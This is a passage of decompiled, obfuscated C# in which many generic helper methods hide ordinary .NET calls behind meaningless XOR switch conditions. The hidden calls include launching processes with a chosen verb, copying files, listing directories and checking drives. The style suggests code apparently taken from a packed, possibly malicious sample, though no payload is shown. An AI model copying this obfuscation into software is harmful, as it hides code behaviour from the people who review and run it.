		bool result = (((char_0 ^ int_0) - 68) ^ 0) switch
		{
			0 => gparam_0.Contains(gparam_1), 
			_ => true, 
		};
		num++;
		return result;
	}

	internal static int smethod_15<T>(T gparam_0, int int_0, char char_0) where T : string
	{
		int num = 0;
		int result;
		int num2;
		do
		{
			result = (((char_0 ^ int_0) - 93) ^ num) switch
			{
				2 => Convert.ToInt32(gparam_0), 
				1 => gparam_0.Length, 
				0 => Conversions.ToInteger((string)gparam_0), 
				_ => 13, 
			};
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static void smethod_16<T>(T gparam_0, int int_0, int int_1) where T : System.Timers.Timer
	{
		int num = 0;
		switch (((int_0 ^ int_1) - 31) ^ 0)
		{
		case 0:
			gparam_0.Start();
			break;
		case 1:
			gparam_0.Stop();
			break;
		}
		num++;
	}

	internal static char smethod_17<T>(T gparam_0, int int_0, char char_0, int int_1) where T : string
	{
		int num = 0;
		char result;
		do
		{
			result = (((char_0 ^ int_1) - 60) ^ num) switch
			{
				0 => gparam_0[int_0], 
				_ => char_0, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	internal static string smethod_18<T>(T gparam_0, byte[] byte_0, short short_0, short short_1) where T : Encoding
	{
		int num = 0;
		string result = (((short_0 ^ short_1) - 72) ^ 0) switch
		{
			0 => (string)(IEnumerable)gparam_0.GetString(byte_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_19<T>(T gparam_0, bool bool_0, char char_0, int int_0) where T : ProcessStartInfo
	{
		int num = 0;
		switch (((int_0 ^ char_0) - 93) ^ 0)
		{
		case 0:
			gparam_0.UseShellExecute = bool_0;
			break;
		}
		num++;
	}

	internal static void smethod_20<T, U, V>(V gparam_0, T gparam_1, U gparam_2, short short_0, char char_0) where T : string where U : string where V : FileSystemProxy
	{
		int num = 0;
		int num2;
		do
		{
			switch (((char_0 ^ short_0) - 86) ^ num)
			{
			case 0:
				((FileSystemProxy)gparam_0).CopyFile((string)gparam_1, (string)gparam_2);
				break;
			}
			num++;
			num2 = char_0 * char_0;
			num2 = char_0 + num2;
		}
		while (num2 % 2 != 0);
	}

	internal static FileSystemProxy smethod_21<T>(T gparam_0, short short_0, char char_0) where T : ServerComputer
	{
		int num = 0;
		FileSystemProxy result = (FileSystemProxy)((((short_0 ^ char_0) - 10) ^ 0) switch
		{
			0 => ((ServerComputer)gparam_0).get_FileSystem(), 
			_ => null, 
		});
		num++;
		return result;
	}

	internal static void smethod_22<T, U>(T gparam_0, U gparam_1, int int_0, char char_0) where T : ProcessStartInfo where U : string
	{
		int num = 0;
		switch (((char_0 ^ int_0) - 41) ^ 0)
		{
		case 0:
			gparam_0.FileName = gparam_1;
			break;
		case 1:
			gparam_0.Verb = gparam_1;
			break;
		}
		num++;
	}

	internal static bool smethod_23<T, U>(U gparam_0, T gparam_1, int int_0, int int_1) where T : string where U : FileSystemProxy
	{
		int num = 0;
		bool result = (((int_0 ^ int_1) - 105) ^ 0) switch
		{
			0 => ((FileSystemProxy)gparam_0).FileExists((string)gparam_1), 
			_ => true, 
		};
		num++;
		return result;
	}

	internal static string[] smethod_24<T, U>(T gparam_0, U gparam_1, int int_0, CompareMethod compareMethod_0, char char_0, short short_0) where T : string where U : string
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		string[] result;
		int num2;
		do
		{
			result = (((char_0 ^ short_0) - 85) ^ num) switch
			{
				0 => Strings.Split((string)gparam_0, (string)gparam_1, int_0, compareMethod_0), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	internal static string[] smethod_25<T>(T gparam_0, int int_0, int int_1) where T : string
	{
		int num = 0;
		string[] result = (((int_0 ^ int_1) - 40) ^ 0) switch
		{
			0 => (string[])(Array)Directory.GetDirectories(gparam_0), 
			_ => null, 
		};
		num++;
		return result;
	}

	internal static void smethod_26<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, short short_0, short short_1) where T : Stream
	{
		int num = 0;
		switch (((short_1 ^ short_0) - 45) ^ 0)
		{
		case 0:
			gparam_0.Write(byte_0, int_0, int_1);
			break;
		}
		num++;
	}

	internal static bool smethod_27<T>(T gparam_0, short short_0, int int_0) where T : DriveInfo
	{
		int num = 0;
		bool result = (((short_0 ^ int_0) - 96) ^ 0) switch
		{
			0 => gparam_0.IsReady, 
			_ => true, 
		};
		num++;
		return result;
	}
}
